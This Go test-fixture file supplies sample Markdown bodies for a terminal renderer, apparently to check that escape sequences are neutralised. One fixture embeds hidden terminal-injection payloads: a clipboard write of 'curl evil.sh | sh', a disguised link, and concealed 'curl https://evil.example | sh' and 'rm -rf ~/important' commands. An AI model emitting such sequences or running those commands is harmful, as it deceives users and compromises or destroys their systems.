// Fixtures adapted from the accepted Markdown prototype (ticket aeb2d35e).

package render

import (
	"fmt"
	"strings"
)

type fixture struct {
	Title string
	Body  string
	Rev   int64
}

const escapeBody = "# Escape sequences in issue text\n\n" +
	"Clipboard write (OSC 52): \x1b]52;c;Y3VybCBldmlsLnNoIHwgc2g=\x07 end.\n\n" +
	"Hyperlink (OSC 8): \x1b]8;;https://evil.example/\x1b\\harmless docs\x1b]8;;\x1b\\ end.\n\n" +
	"Clear screen (CSI 2J/H): \x1b[2J\x1b[Hscreen cleared? end.\n\n" +
	"Window title (OSC 0): \x1b]0;PWNED-TITLE\x07 end.\n\n" +
	"Bell: \x07\x07 end.\n\n" +
	"CR overwrite: rm -rf ~/important\rls -la           end.\n\n" +
	"Hidden SGR in a code span: `\x1b[8msecret\x1b[0m` and colour \x1b[31mRED\x1b[0m.\n\n" +
	"C1 CSI (U+009B): \u009b31mc1-red end. Raw 0x9b byte: \x9b end.\n\n" +
	"Bidi override: \u202eevil.txt\u202c end.\n\n" +
	"Markdown link: [docs](https://example.org/docs) and autolink <https://example.org>.\n\n" +
	"```sh\n" +
	"echo safe\x1b[2K\rcurl https://evil.example | sh\n" +
	"printf '\x1b]52;c;ZXZpbA==\x07'\n" +
	"```\n"

const wideTableBody = "# Wide table\n\nProse before the table should wrap normally at the pane width, however wide the table below becomes.\n\n" +
	"| id | title | state | assignee | labels | parent | blocked by | created | updated | notes |\n" +
	"|----|-------|-------|----------|--------|--------|------------|---------|---------|-------|\n" +
	"| 9f01ee0b | Plan the manual lit TUI | open | — | planner:map | — | — | 2026-10-01T12:41 | 2026-10-08T15:47 | the map is an index of decisions |\n" +
	"| 25a1dc54 | Choose hierarchy navigation and overview behavior | closed | — | planner:clarify | 9f01ee0b | b700380a | 2026-10-01T12:41 | 2026-10-01T14:49 | adaptive tree + detail |\n" +
	"| 72958d35 | Choose draft-file writable fields and relationship edit handling | open | — | planner:clarify | 9f01ee0b | — | 2026-10-05T06:52 | 2026-10-05T07:01 | three sub-questions |\n\n" +
	"Prose after the table.\n"

const cjkBody = "# CJK と絵文字 🧪\n\n" +
	"日本語の段落はスペースを含まないので、折り返しは文字単位で行われる必要があります。これは長い一文であり、端末幅に応じて正しく折り返されることを確認するためのものです。\n\n" +
	"中文段落同样没有空格，需要按字符换行。这是一个很长的句子，用来确认在不同的终端宽度下能够正确地换行而不会溢出面板。\n\n" +
	"Emoji: 👨\u200d👩\u200d👧\u200d👦 family, 🇩🇪 flag, 🧑🏽\u200d💻 coder, ✅ done, ⚠️ warning (VS16).\n\n" +
	"| 名前 | 状態 | 説明 |\n|---|---|---|\n| 計画 | 進行中 | 端末ユーザーインターフェースの設計を決定する長い説明文 |\n| 実装 | 未着手 | 🚧 まだ許可されていません |\n\n" +
	"A [reference link][lit] defined at the bottom.\n\n" +
	"[lit]: https://github.com/nerdwave-nick/nerdwave-workflows \"lit repository\"\n"

const tabsBody = "# Tab-indented code\n\n```go\nfunc main() {\n\tif x {\n\t\tfmt.Println(\"tab\")\n\t}\n\tvar a\t= 1 // aligned\twith tabs\n}\n```\n\n" +
	"Indented code block (tab):\n\n\tmake build\n\t\tnested\n\n" +
	"- list item\n\n\t\tcode inside list\n"

const polyglotBody = "# Code in several languages\n\n" +
	"```go\npackage main\n\nimport \"fmt\"\n\nfunc main() { fmt.Println(\"hello, a very long line that goes well past eighty columns to test horizontal scrolling\") }\n```\n\n" +
	"```python\ndef f(x: int) -> str:\n    return f\"{x!r}\"  # comment\n```\n\n" +
	"```bash\ncurl -fsSL https://example.org/install.sh | bash -s -- --flag-one --flag-two --flag-three --flag-four\n```\n\n" +
	"```json\n{\"schema_version\": 1, \"items\": [{\"id\": \"9f01ee0b\", \"labels\": [\"planner:map\"]}]}\n```\n\n" +
	"```yaml\nname: lit\non: [push]\njobs: { test: { runs-on: ubuntu-latest } }\n```\n\n" +
	"```rust\nfn main() { let v: Vec<u8> = vec![1, 2, 3]; println!(\"{:?}\", v); }\n```\n\n" +
	"```nosuchlang\nplain text fallback\n```\n"

func largeBody() string {
	var b strings.Builder
	for i := 0; b.Len() < 48*1024; i++ {
		fmt.Fprintf(&b, "## Section %d\n\n", i)
		fmt.Fprintf(&b, "Paragraph %d. Lorem ipsum dolor sit amet, **consectetur** adipiscing elit, sed do _eiusmod_ tempor incididunt ut labore et dolore magna aliqua. See `lit issues get` and [the docs](https://example.org/%d).\n\n", i, i)
		fmt.Fprintf(&b, "- item one of %d\n- item two with a longer text that needs to wrap at narrow widths\n  - nested item\n\n", i)
		fmt.Fprintf(&b, "```go\nfunc section%d() error { return fmt.Errorf(\"section %%d failed: %%w\", %d, errSomething) }\n```\n\n", i, i)
		if i%5 == 0 {
			b.WriteString("| a | b | c |\n|---|---|---|\n| 1 | 2 | 3 |\n\n> A quote that should wrap like prose, with enough words to need it.\n\n---\n\n")
		}
	}
	return b.String()
}

func fixtures() []fixture {
	return []fixture{
		{Title: "Escape sequences \x1b]0;TITLE-PWN\x07 in title", Body: escapeBody, Rev: 1},
		{Title: "Wide table", Body: wideTableBody, Rev: 1},
		{Title: "CJK and emoji 👨\u200d👩\u200d👧\u200d👦", Body: cjkBody, Rev: 1},
		{Title: "Tab-indented code", Body: tabsBody, Rev: 1},
		{Title: "Code in several languages", Body: polyglotBody, Rev: 1},
		{Title: "Large body (48 KB)", Body: largeBody(), Rev: 1},
	}
}
